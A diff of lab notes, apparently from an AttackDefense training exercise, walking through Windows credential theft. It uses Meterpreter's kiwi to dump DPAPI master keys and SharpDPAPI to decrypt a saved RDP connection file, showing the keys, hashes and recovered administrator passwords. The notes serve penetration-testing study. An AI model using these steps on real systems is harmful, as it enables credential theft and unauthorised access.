@@ -67,7 +67,7 @@ You can use Mimikatz module and rdp module
 
 connect with xfreerdp
 --------------------
-#xfreerdp /u:administrator /p:sebastian /v:10.4.26.2
+#xfreerdp /u:administrator /p:sebastian /v:10.4.26.2 /size:360x800
 
 Which one of the following is NOT a CrackMapExec SMB module? > hashcat
 
@@ -94,8 +94,28 @@ To decrypt rdg file, we use SharpDPAI.exe > so that upload that exe file
 -------------------------------------------------------------------------
 C:> SharpDPAI.exe rdg /unprotected
 
+UserName   : ATTACKDEFENSE\Administrator
+Password   : MasterKey needed - {5cd55013-c838-40c4-95a9-26ab076e5abb}
 
+In order to know the password we need masterkey > use kiwi
 
+meterpreter > load kiwi
+            > kiwi_cmd sekurlsa::dpapi
 
+     * GUID      :	{5cd55013-c838-40c4-95a9-26ab076e5abb}
+	 * Time      :	6/18/2024 3:36:46 PM
+	 * MasterKey :	be8dabf90b25d127a8b0421c888f5c23c81f8254c25fa861df4c0e61ed665f79dcac5809c793a5a1b65f3604ec1dd216f74badc6e06b04ebff5b87390ce0c794
+	 * sha1(key) :	d174357a9a91ede12834ad2cfc5a9f94f8956205
 
+In order to decrypt masterkey, we need GUID and sha1(key)
+
+{5cd55013-c838-40c4-95a9-26ab076e5abb}:d174357a9a91ede12834ad2cfc5a9f94f8956205
+
+C:> SharpDPAPI.exe rdg {5cd55013-c838-40c4-95a9-26ab076e5abb}:d174357a9a91ede12834ad2cfc5a9f94f8956205
+
+Profile Name : ATTACKDEFENSE\Administrator
+  UserName   : ATTACKDEFENSE\Administrator
+  Password   : harry_123321
+
+Connect to the remote host with xfreerdp
 _______________________________________________________________________________________________________________________________________________________________________
